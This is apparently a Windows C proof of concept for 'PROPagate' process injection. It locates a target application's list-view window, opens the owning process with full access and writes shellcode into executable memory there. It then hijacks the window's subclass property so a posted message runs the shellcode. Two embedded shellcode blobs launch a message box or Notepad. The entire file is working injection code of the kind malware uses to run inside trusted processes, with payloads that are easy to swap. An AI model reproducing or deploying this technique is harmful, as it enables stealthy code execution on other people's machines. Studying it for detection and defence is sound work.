/*
* 能注入的进程不多，而且大多数需要管理员权限才可以，比较鸡肋 
*/

#define UNICODE
#include <windows.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "comctl32.lib")

#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")


typedef LRESULT(CALLBACK* SUBCLASSPROC)(
	HWND      hWnd,
	UINT      uMsg,
	WPARAM    wParam,
	LPARAM    lParam,
	UINT_PTR  uIdSubclass,
	DWORD_PTR dwRefData);

typedef struct _SUBCLASS_CALL {
	SUBCLASSPROC pfnSubclass;    // subclass procedure
	WPARAM       uIdSubclass;    // unique subclass identifier
	DWORD_PTR    dwRefData;      // optional ref data
} SUBCLASS_CALL, PSUBCLASS_CALL;

typedef struct _SUBCLASS_FRAME {
	UINT                    uCallIndex;   // index of next callback to call
	UINT                    uDeepestCall; // deepest uCallIndex on stack
	struct _SUBCLASS_FRAME* pFramePrev;  // previous subclass frame pointer
	struct _SUBCLASS_HEADER* pHeader;     // header associated with this frame
} SUBCLASS_FRAME, PSUBCLASS_FRAME;

typedef struct _SUBCLASS_HEADER {
	UINT           uRefs;        // subclass count
	UINT           uAlloc;       // allocated subclass call nodes
	UINT           uCleanup;     // index of call node to clean up
	DWORD          dwThreadId;   // thread id of window we are hooking
	SUBCLASS_FRAME* pFrameCur;   // current subclass frame pointer
	SUBCLASS_CALL  CallArray[1]; // base of packed call node array
} SUBCLASS_HEADER, * PSUBCLASS_HEADER;


PWCHAR GetNameByPid(DWORD pid)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
		return 0;

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(snapshot, &pe)) {
		do {
			if (pe.th32ProcessID == pid)
			{
				return pe.szExeFile;
			}
		} while (Process32Next(snapshot, &pe));
	}

	CloseHandle(snapshot);
	return NULL;
}

VOID propagate(LPVOID payload, DWORD payloadSize) 
{
	HANDLE          hp, p;
	DWORD           id;
	HWND            pwh, cwh;
	SUBCLASS_HEADER sh;
	LPVOID          psh, pfnSubclass;
	SIZE_T          rd, wr;
	BOOL			bUxSubclassInfo = TRUE;

	// 1. Obtain the parent window handle
	pwh = FindWindow(L"EVERYTHING", NULL);

	// 2. Obtain the child window handle
	cwh = FindWindowEx(pwh, NULL, L"SysListView32", NULL);

	// 3. Obtain the handle of subclass header
	p = GetProp(cwh, L"UxSubclassInfo");
	if (p == 0)
	{
		bUxSubclassInfo = FALSE;
		p = GetProp(cwh, L"CC32SubclassInfo");
		if (p == 0)
		{
			printf("GetProp(cwh, CC32SubclassInfo) failed \n");
			return;
		}
	}


	// GetProcessHandleFromHwnd
	// 4. Obtain the process id for the explorer.exe
	GetWindowThreadProcessId(cwh, &id);

	// 5. Open explorer.exe
	hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
	if (hp == INVALID_HANDLE_VALUE)
	{
		printf("open process failed %d\n", GetLastError());
		return;
	}


	printf("process name : %ws\t%d\n", GetNameByPid(id), id);

	// 6. Read the contents of current subclass header
	ReadProcessMemory(hp, (LPVOID)p, &sh, sizeof(sh), &rd);

	// 7. Allocate RW memory for a new subclass header
	psh = VirtualAllocEx(hp, NULL, sizeof(sh),
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// 8. Allocate RWX memory for the payload
	pfnSubclass = VirtualAllocEx(hp, NULL, payloadSize,
		MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// 9. Write the payload to memory
	WriteProcessMemory(hp, pfnSubclass,
		payload, payloadSize, &wr);

	printf("shellcode wpm to %p\n", pfnSubclass);
	getchar();

	// 10. Set the pfnSubclass field to payload address, and write
	//    back to process in new area of memory
	sh.CallArray[0].pfnSubclass = (SUBCLASSPROC)pfnSubclass;
	WriteProcessMemory(hp, psh, &sh, sizeof(sh), &wr);

	// 11. update the subclass procedure with SetProp
	if (bUxSubclassInfo)
	{
		SetProp(cwh, L"UxSubclassInfo", psh);
	}
	else
	{
		SetProp(cwh, L"CC32SubclassInfo", psh);
	}


	// 12. Trigger the payload via a windows message
	PostMessage(cwh, WM_CLOSE, 0, 0);
	//PostMessage(cwh, WM_PAINT, 0, 0);
	
	
	// 13. Restore original subclass header
	// SetProp(cwh, L"UxSubclassInfo", p);

	// 14. free memory and close handles
	VirtualFreeEx(hp, psh, 0, MEM_DECOMMIT | MEM_RELEASE);
	VirtualFreeEx(hp, pfnSubclass, 0, MEM_DECOMMIT | MEM_RELEASE);

	CloseHandle(hp);
}

int PropagateExecute()
{
	UCHAR shellcode_msg[] =
		"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

	unsigned char shellcode2[344] = {
		0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8D, 0x48, 0xD8, 0xC7, 0x40, 0xD8, 0x57, 0x69,
		0x6E, 0x45, 0xC7, 0x40, 0xDC, 0x78, 0x65, 0x63, 0x00, 0xC7, 0x40, 0xE0, 0x6E, 0x6F, 0x74, 0x65,
		0xC7, 0x40, 0xE4, 0x70, 0x61, 0x64, 0x00, 0xE8, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74,
		0x0C, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF, 0xD0, 0x33, 0xC0, 0x48,
		0x83, 0xC4, 0x48, 0xC3, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
		0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC,
		0x20, 0x48, 0x63, 0x41, 0x3C, 0x48, 0x8B, 0xD9, 0x4C, 0x8B, 0xE2, 0x8B, 0x8C, 0x08, 0x88, 0x00,
		0x00, 0x00, 0x85, 0xC9, 0x74, 0x37, 0x48, 0x8D, 0x04, 0x0B, 0x8B, 0x78, 0x18, 0x85, 0xFF, 0x74,
		0x2C, 0x8B, 0x70, 0x1C, 0x44, 0x8B, 0x70, 0x20, 0x48, 0x03, 0xF3, 0x8B, 0x68, 0x24, 0x4C, 0x03,
		0xF3, 0x48, 0x03, 0xEB, 0xFF, 0xCF, 0x49, 0x8B, 0xCC, 0x41, 0x8B, 0x14, 0xBE, 0x48, 0x03, 0xD3,
		0xE8, 0x87, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x25, 0x85, 0xFF, 0x75, 0xE7, 0x33, 0xC0, 0x48,
		0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x8B,
		0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0xC3, 0x0F, 0xB7,
		0x44, 0x7D, 0x00, 0x8B, 0x04, 0x86, 0x48, 0x03, 0xC3, 0xEB, 0xD4, 0xCC, 0x48, 0x89, 0x5C, 0x24,
		0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48,
		0x8B, 0xF9, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0x50, 0x18, 0x48, 0x8B, 0x5A, 0x10, 0xEB, 0x16, 0x4D,
		0x85, 0xC0, 0x75, 0x1A, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0xC8, 0xE8, 0x35, 0xFF, 0xFF, 0xFF, 0x48,
		0x8B, 0x1B, 0x4C, 0x8B, 0xC0, 0x48, 0x8B, 0x43, 0x30, 0x48, 0x85, 0xC0, 0x75, 0xE1, 0x48, 0x8B,
		0x5C, 0x24, 0x30, 0x49, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x44, 0x8A, 0x01, 0x45,
		0x84, 0xC0, 0x74, 0x1A, 0x41, 0x8A, 0xC0, 0x48, 0x2B, 0xCA, 0x44, 0x8A, 0xC0, 0x3A, 0x02, 0x75,
		0x0D, 0x48, 0xFF, 0xC2, 0x8A, 0x04, 0x11, 0x44, 0x8A, 0xC0, 0x84, 0xC0, 0x75, 0xEC, 0x0F, 0xB6,
		0x0A, 0x41, 0x0F, 0xB6, 0xC0, 0x2B, 0xC1, 0xC3
	};


	propagate(shellcode2, sizeof(shellcode2));
	return 0;
}